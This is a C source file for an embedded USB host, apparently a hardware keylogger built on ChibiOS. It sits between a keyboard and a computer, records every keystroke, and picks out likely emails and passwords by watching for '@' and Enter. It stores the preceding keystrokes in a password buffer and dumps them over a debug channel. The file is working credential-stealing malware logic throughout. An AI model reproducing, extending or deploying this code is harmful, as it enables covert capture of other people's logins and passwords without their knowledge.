//usbh.c

#include "hal.h"

#include "rtt.h"
#include "spi.h"
#include "usb.h"
#include "usbh.h"

#include "usbh_custom_class_example.h"

#include "usbh/debug.h"
#include "usbh/dev/hid.h"
#include <string.h>

/*
 * defines
 */
#define MB_SIZE 200
#define NB_INPUT 200
#define PASSWORD_MAX_SIZE 20  // must be < NB_INPUT

/*
 * variables
 */
static uint16_t inputs[NB_INPUT];
static int      input_timer     = -1;
static int      input_index     = 0;
static int      password_index  = 0;
static int      nb_char_pressed = 0;

uint8_t  led_status = 7;
uint16_t passwords[PASSWORD_BUFFER_SIZE];

/*
 * Mailbox
 */
mailbox_t umb;
msg_t     umb_buffer[MB_SIZE];
MAILBOX_DECL(umb, umb_buffer, MB_SIZE);

/*
 * prototypes
 */
static void usbh_detector(char input);

/*
 * thread HID
 */
static THD_WORKING_AREA(waTestHID, 1024);
static THD_WORKING_AREA(waUsbhMainLoop, 1024);
static USBH_DEFINE_BUFFER(uint8_t report[HAL_USBHHID_MAX_INSTANCES][8]);
static USBHHIDConfig hidcfg[HAL_USBHHID_MAX_INSTANCES];

/*
 * Input callback
 */
static void _hid_report_callback(USBHHIDDriver *hidp, uint16_t len)
{
    (void)len;
    uint8_t *report = (uint8_t *)hidp->config->report_buffer;

    if(hidp->type == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
        //already in a I-class lock
        chMBPostI(&umb, (msg_t)report);
    }
}

/*
 * LED manager
 */
static void ThreadTestHID(void *p)
{
    (void)p;
    uint8_t i;

    chRegSetThreadName("HID");

    for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
        hidcfg[i].cb_report     = _hid_report_callback;
        hidcfg[i].protocol      = USBHHID_PROTOCOL_BOOT;
        hidcfg[i].report_buffer = report[i];
        hidcfg[i].report_len    = 8;
    }

    for(;;) {
        for(i = 0; i < HAL_USBHHID_MAX_INSTANCES; i++) {
            if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_ACTIVE) {
                rtt_printf("HID: Connected, HID%d", i);
                usbhhidStart(&USBHHIDD[i], &hidcfg[i]);
                if(usbhhidGetType(&USBHHIDD[i]) != USBHHID_DEVTYPE_GENERIC) {
                    usbhhidSetIdle(&USBHHIDD[i], 0, 0);
                }
            } else if(usbhhidGetState(&USBHHIDD[i]) == USBHHID_STATE_READY) {
                if(usbhhidGetType(&USBHHIDD[i]) == USBHHID_DEVTYPE_BOOT_KEYBOARD) {
                    USBH_DEFINE_BUFFER(uint8_t val);
                    val = led_status;
                    usbhhidSetReport(&USBHHIDD[i], 0, USBHHID_REPORTTYPE_OUTPUT, &val, 1);
                }
            }
        }
        chThdSleepMilliseconds(200);
    }
}

static void ThreadUsbhMainLoop(void *p)
{
    (void)p;
    chRegSetThreadName("USBH");

    for(;;) {
        //start USB_OTG2 when the keyboard is detected for the first time
        if(USBHHIDD->state == USBHHID_STATE_READY && USBD2.state == USB_STOP)
            usb_start();
        usbhMainLoop(&USBHD1);
        chThdSleepMilliseconds(50);
    }
}

/*
 * Initialisation of OTG FS port connected to a keyboard.
 */
void usbh_init(void)
{
    /*USBH_FS OTG*/
    palSetPadMode(GPIOA, GPIOA_OTG_FS_VBUS, PAL_MODE_OUTPUT_PUSHPULL);
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DM, PAL_MODE_ALTERNATE(10));
    palSetPadMode(GPIOA, GPIOA_OTG_FS_DP, PAL_MODE_ALTERNATE(10));

    rtt_printf("Turn on USB power");
    palSetPad(GPIOB, GPIOA_OTG_FS_VBUS);
    chThdSleepMilliseconds(100);

    usbhStart(&USBHD1);
    chThdCreateStatic(waTestHID, sizeof(waTestHID), NORMALPRIO, ThreadTestHID, 0);
    chThdCreateStatic(waUsbhMainLoop, sizeof(waUsbhMainLoop), NORMALPRIO, ThreadUsbhMainLoop, 0);
}

void usbh_add_input(uint16_t input)
{
    if((uint8_t)input) {
        inputs[input_index] = input;
        usbh_detector(hid_to_azerty(input));

        //input loop
        input_index++;
        if(input_index >= NB_INPUT)
            input_index = 0;
    }
}

/* 
 * Store <size> lasts inputs into password buffer
 * size: number of inputs to store
 */
static void store_lasts_inputs(int size)
{
    if(input_index < size - 1) {  // buffer made a loop
        int bytes_written = size - input_index - 1;
        //end inputs
        memcpy(passwords + password_index, inputs + NB_INPUT - bytes_written, (bytes_written)*2);
        //start inputs
        memcpy(passwords + password_index + bytes_written, inputs, (input_index + 1) * 2);
    } else {
        memcpy(passwords + password_index, inputs + input_index - size + 1, size * 2);
    }
    password_index += size;
}

void usbh_detector(char input)
{
    if(password_index + PASSWORD_MAX_SIZE > PASSWORD_BUFFER_SIZE) {  // avoid max password buffer
        rtt_printf("[WARNING] Password buffer full\n");
        return;
    }
    nb_char_pressed++;
    // check if current input is interesting
    switch(input) {
        case '@':  // email is expected
            rtt_printf("@ detected\n");
            if(nb_char_pressed > PASSWORD_MAX_SIZE)
                nb_char_pressed = PASSWORD_MAX_SIZE;
            input_timer         = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            break;
        case '\n':  // password is expected
            rtt_printf("[enter] detected\n");
            if(nb_char_pressed > PASSWORD_MAX_SIZE)
                nb_char_pressed = PASSWORD_MAX_SIZE;
            store_lasts_inputs(nb_char_pressed);
            nb_char_pressed = 0;
            // disable input timer
            input_timer = -1;
            // print password buffer
            rtt_printf("PASSWORD :");
            SEGGER_RTT_Write(0, passwords, password_index);
            rtt_printf("");
            break;
    }
    // if input timer is not disabled, decrease its value
    if(input_timer != -1)
        input_timer--;
    // if input timer value is 0, store lasts inputs
    if(input_timer == 0) {
        store_lasts_inputs(PASSWORD_MAX_SIZE);
        rtt_printf("PASSWORD :");
        SEGGER_RTT_Write(0, passwords, password_index);
        rtt_printf("");
    }
}

void usbh_print_input(void)
{
    int nb_input_print = 20;
    int start          = (input_index - nb_input_print > 0) ? input_index - nb_input_print : 0;
    for(int i = start; i < input_index; i++)
        rtt_printf("inputs[%d] = %c (%04x)", i, hid_to_azerty(inputs[i]), inputs[i]);
}

void usbh_print_password(void)
{
    int nb_password_print = 20;
    int start             = (password_index - nb_password_print > 0) ? password_index - nb_password_print : 0;
    for(int i = start; i < password_index; i++)
        rtt_printf("passwords[%d] = %c (%04x)", i, hid_to_azerty(passwords[i]), passwords[i]);
}
